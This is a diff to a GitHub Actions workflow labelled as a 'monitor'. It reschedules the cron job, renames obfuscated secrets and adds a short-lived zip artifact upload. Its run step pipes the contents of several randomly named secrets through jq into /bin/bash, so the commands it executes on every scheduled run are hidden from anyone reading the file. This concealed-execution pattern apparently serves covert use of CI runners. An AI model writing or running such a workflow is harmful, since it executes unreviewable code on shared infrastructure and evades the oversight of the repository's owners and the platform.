@@ -1,25 +1,30 @@
 name: brendamonitor204
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '39 4/6 * * *'
 
+  schedule:
+    - cron: '59 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: brendamonitor204
         env:
-          ys2: ${{ secrets.ys2 }}
+          xut45451: ${{ secrets.xut45451 }}
         run: |
-          echo $ys2 | jq -r .po9 | /bin/bash
-          echo $xdy2150 | jq -r .gf1253 | /bin/bash
-          echo $q9706 | jq -r .nptrn38802 | /bin/bash
-          echo $mck0628 | jq -r .zrt177 | /bin/bash
-          echo $ihdhj7 | jq -r .uusxb23646 | /bin/bash
-          echo $hjsh378 | jq -r .tky67171 | /bin/bash
-          echo $rytae36 | jq -r .lj26814 | /bin/bash
+          printf '%s' "$xut45451" | jq -r .lownk330 | /bin/bash
+          printf '%s' "$avnfe39750" | jq -r .m5575 | /bin/bash
+          printf '%s' "$ledca85" | jq -r .vkxju51926 | /bin/bash
+          printf '%s' "$mldba96" | jq -r .bxgyk398 | /bin/bash
+          echo $fw86554 | jq -r .lji2903 | /bin/bash
+          printf '%s' "$icpr08806" | jq -r .cb1 | /bin/bash
+          echo $uizn0573 | jq -r .h2678 | /bin/bash
+          printf '%s' "$irq6" | jq -r .yyjvd480 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: mcrEcFQL
+          path: "*.zip"
+          retention-days: 1
